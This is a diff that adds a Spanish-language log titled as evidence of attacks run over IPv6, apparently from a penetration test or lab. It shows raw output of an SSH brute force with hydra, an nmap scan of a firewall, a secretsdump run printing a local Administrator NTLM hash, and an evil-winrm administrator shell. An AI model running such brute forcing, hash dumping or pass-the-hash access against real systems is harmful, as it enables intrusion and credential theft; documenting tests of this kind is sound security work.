@@ -1,0 +1,26 @@
+################ EVIDENCIA DE EJECUCION DE ATAQUES SOBRE IPv6 ################
+
+===== 17. FUERZA BRUTA SSH sobre IPv6 (hydra -6) =====
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 6 login tries (l:1/p:6), ~2 tries per task
+[DATA] attacking ssh://[2600:1f18:11e4:1301:500:56aa:e0ef:bddd]:22/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-08 14:20:41
+
+===== 18. ESCANEO DE PUERTOS sobre IPv6 (nmap -6) al firewall =====
+Nmap scan report for fw-gateway (2600:1f18:11e4:1302:5383:fd40:27af:a01c)
+22/tcp   open   ssh
+Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
+
+===== 19. PASS-THE-HASH: captura de hash NTLM sobre IPv6 (secretsdump -target-ip) =====
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+
+===== 20. PAYLOAD: ejecucion por WinRM sobre IPv6 (evil-winrm -i winws6) =====
+[0;34mInfo: Connection successful[0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator.EMPRESA\Documents> whoami
+empresa\administrator
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator.EMPRESA\Documents> hostname
+
+############################## FIN EVIDENCIA ##############################
